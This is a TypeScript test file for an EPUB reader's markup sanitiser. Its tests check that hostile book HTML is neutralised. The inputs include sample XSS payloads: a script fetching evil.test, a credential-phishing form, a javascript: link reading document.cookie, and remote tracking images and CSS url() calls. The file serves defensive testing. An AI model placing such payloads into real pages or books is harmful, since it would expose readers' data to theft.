import { describe, expect, it } from 'vitest';
import { sanitizeChapter, RESOURCE_ATTR, EXTERNAL_ATTR } from '~/core/sanitize/sanitize';

const clean = (markup: string) => sanitizeChapter(markup, { basePath: 'OEBPS/ch1.xhtml' });

/**
 * The threat: a crafted book executing script in our origin and reading the
 * reader's entire library out of IndexedDB. Everything here is a payload a
 * hostile EPUB could plausibly ship.
 */
describe('sanitising hostile book markup', () => {
  it('strips script tags', () => {
    const result = clean('<p>before</p><script>fetch("https://evil.test")</script><p>after</p>');
    expect(result.html).not.toContain('script');
    expect(result.html).not.toContain('evil.test');
    expect(result.html).toContain('before');
    expect(result.html).toContain('after');
  });

  it('strips event handlers', () => {
    const result = clean('<p onclick="steal()" onmouseover="steal()">text</p>');
    expect(result.html).not.toContain('onclick');
    expect(result.html).not.toContain('onmouseover');
    expect(result.html).toContain('text');
  });

  it('neutralises javascript: links', () => {
    const result = clean('<a href="javascript:alert(document.cookie)">click</a>');
    expect(result.html).not.toContain('javascript:');
    expect(result.html).toContain('click');
  });

  it('removes iframes, objects and embeds', () => {
    const result = clean(
      '<iframe src="https://evil.test"></iframe><object data="x.swf"></object><embed src="y">',
    );
    expect(result.html).not.toMatch(/iframe|object|embed/);
  });

  it('removes forms and inputs, so no book can phish for credentials', () => {
    const result = clean('<form action="https://evil.test"><input name="password"></form>');
    expect(result.html).not.toMatch(/form|input/);
  });

  it('drops srcdoc and formaction', () => {
    const result = clean('<iframe srcdoc="<script>x</script>"></iframe><button formaction="x">');
    expect(result.html).not.toContain('srcdoc');
    expect(result.html).not.toContain('formaction');
  });

  it('strips style elements entirely', () => {
    const result = clean(
      '<style>body { background: url(https://evil.test/pixel) }</style><p>hi</p>',
    );
    expect(result.html).not.toContain('evil.test');
    expect(result.html).toContain('hi');
  });

  it('keeps only meaningful inline style declarations', () => {
    const result = clean(
      '<p style="font-style: italic; position: fixed; background: url(https://evil.test)">x</p>',
    );
    expect(result.html).toContain('font-style: italic');
    expect(result.html).not.toContain('position');
    expect(result.html).not.toContain('evil.test');
  });

  it('does not let a url() through an allowed property', () => {
    const result = clean('<p style="text-decoration: url(https://evil.test)">x</p>');
    expect(result.html).not.toContain('evil.test');
  });
});

describe('external references', () => {
  it('refuses to load a remote image', () => {
    const result = clean('<img src="https://evil.test/pixel.gif" alt="tracking">');
    expect(result.html).not.toContain('evil.test');
    expect(result.html).toContain(EXTERNAL_ATTR);
    expect(result.blockedExternal).toContain('https://evil.test/pixel.gif');
  });

  it('strips srcset, which can smuggle a remote URL past a src check', () => {
    const result = clean('<img src="local.png" srcset="https://evil.test/2x.png 2x">');
    expect(result.html).not.toContain('srcset');
    expect(result.html).not.toContain('evil.test');
  });

  it('renders an external link as inert text rather than a live link', () => {
    const result = clean('<a href="https://example.com/page">read more</a>');
    expect(result.html).not.toContain('href');
    expect(result.html).toContain('read more');
    expect(result.blockedExternal).toContain('https://example.com/page');
  });
});

describe('in-archive references', () => {
  it('rewrites an image to a resource token with no live src', () => {
    // Chapters usually sit in their own directory, so `../images/…` is the
    // common shape and must resolve back up into the book, not out of it.
    const result = sanitizeChapter('<img src="../images/plate.png" alt="A plate">', {
      basePath: 'OEBPS/text/ch1.xhtml',
    });

    // A real src would make the browser fetch before any of our code runs.
    expect(result.html).not.toMatch(/\ssrc=/);
    expect(result.html).toContain(RESOURCE_ATTR);
    expect(result.html).toContain('OEBPS/images/plate.png');
    expect(result.resources).toEqual(['OEBPS/images/plate.png']);
    expect(result.html).toContain('alt="A plate"');
  });

  it('records internal links for the chapter graph', () => {
    const result = clean('<a href="ch2.xhtml#scene-2">later</a>');
    expect(result.links).toEqual([{ href: 'OEBPS/ch2.xhtml', fragment: 'scene-2' }]);
    expect(result.html).toContain('data-btf-link="OEBPS/ch2.xhtml#scene-2"');
  });

  it('keeps same-document fragment links', () => {
    const result = clean('<a href="#footnote-1">1</a>');
    expect(result.html).toContain('href="#footnote-1"');
  });
});

describe('preserving the book', () => {
  it('keeps the structural markup segmentation depends on', () => {
    const result = clean(
      '<h1>Title</h1><p>Prose.</p><blockquote>Quoted.</blockquote><hr/><ul><li>a</li></ul><table><tr><td>c</td></tr></table>',
    );
    for (const tag of ['h1', 'p', 'blockquote', 'hr', 'ul', 'li', 'table', 'td']) {
      expect(result.html).toContain(`<${tag}`);
    }
  });

  it('keeps emphasis, ruby and direction attributes', () => {
    const result = clean('<p dir="rtl" lang="he"><em>x</em><ruby>漢<rt>kan</rt></ruby></p>');
    expect(result.html).toContain('dir="rtl"');
    expect(result.html).toContain('lang="he"');
    expect(result.html).toContain('<em>');
    expect(result.html).toContain('<ruby>');
  });

  it('keeps text when its wrapper is stripped', () => {
    const result = clean('<div><span style="color:red">important words</span></div>');
    expect(result.html).toContain('important words');
  });
});
